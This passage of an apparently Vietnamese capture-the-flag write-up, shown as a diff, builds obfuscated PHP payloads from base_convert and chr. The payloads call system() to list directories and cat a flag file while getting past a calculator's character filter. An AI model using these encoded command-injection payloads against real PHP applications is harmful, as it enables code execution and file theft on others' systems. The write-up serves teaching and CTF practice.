@@ -53,8 +53,11 @@ Quay lại với hình 1 nhé, coi lại chỗ để nhập phép tính. Trong �
 ### system(ls)
 
 >system():					base_convert(1751504350,10,36)()
+
 >ls:						    base_convert(784,10,36)
+
 >**PAYLOAD: base_convert(1751504350,10,36)(base_convert(784,10,36))**
+
 Sau đó sẽ trả về kết quả:
 
 ![hinh8](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139471146_1360942944258370_7846989612733427119_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=x7CD47HUc1kAX85inpR&_nc_ht=scontent.fsgn2-3.fna&oh=d451023b8209c672721204c1e1177bbd&oe=6026CED9)
@@ -66,10 +69,15 @@ Mình đi ra thư mục gốc xem thử có flag ngoài đó hong
 Lúc này có cái khó khăn là có khoảng trắng và dấu '/'. hmmmmm? làm shaooooo?
 Mình tìm mọi cách và được chỉ dẫn đến sử dụng **ord** để lấy mã ascii 1 chữ và **chr** để đổi ascii ra ký tự. Việc mình cần làm là gọi hàm **chr** thông qua hàm **base_convert** và số (số này là đổi chuỗi "chr" từ base-36 sang base-10). Tiếp đó dùng các dấu '.' để nối các hàm lại với nhau.
 >system():					base_convert(1751504350,10,36)()
+
 >ls:						    base_convert(784,10,36)
+
 >space:             base_convert(16191,10,36)(32)
+
 >/:                 base_convert(16191,10,36)(47)
+
 >**PAYLOAD: base_convert(1751504350,10,36)(base_convert(784,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47))**
+
 Nhận ngay kết quả: 
 
 ![hinh9](https://scontent.fsgn2-4.fna.fbcdn.net/v/t1.0-9/137328100_1360948444257820_2551682331755669394_n.png?_nc_cat=101&ccb=2&_nc_sid=730e14&_nc_ohc=LNzI_tUCEPsAX9gLo1d&_nc_ht=scontent.fsgn2-4.fna&oh=113d5590d5f2fa6155970803f6328907&oe=60294521)
@@ -78,16 +86,27 @@ Nhận ngay kết quả:
 Giờ thì mình mở ra xem hoyyyyy
 
 ### system(cat /flag_a2647e5eb8e9e767fe298aa012a49b50)
+
 >system():					                   base_convert(1751504350,10,36)()
+
 >cat:						                      base_convert(15941,10,36)
+
 >space:						                    .base_convert(16191,10,36)(32)
+
 >/:						                        .base_convert(16191,10,36)(47)
+
 >flag:					                    	.base_convert(727432,10,36)
+
 >_:				                         		.base_convert(16191,10,36)(95)
+
 >a2647e5eb8e9e767fe298aa012a49b50):		.base_convert(788365066082,10,36)
+
 >						                         	.base_convert(880282369231,10,36)
+
 >						                         	.base_convert(1206073849608,10,36)
+
 >					                        		.base_convert(83329543332,10,36)
+
 
 Đoạn nào chữ thôi thì mình chỉ cnầ dùng **base_convert** còn đoạn nào có ký tự đặc biệt thì mình kết hợp với **chr** (16191 base36) nữa nhé!
 Ở chuỗi chữ và số dài loằng ngoằng kia ban đầu mình chỉ dùng 1 lần **base_convert** nhưng mà nó bị tràn số ra kết quả hong chính xác nên mình chia thành 4 đoạn.
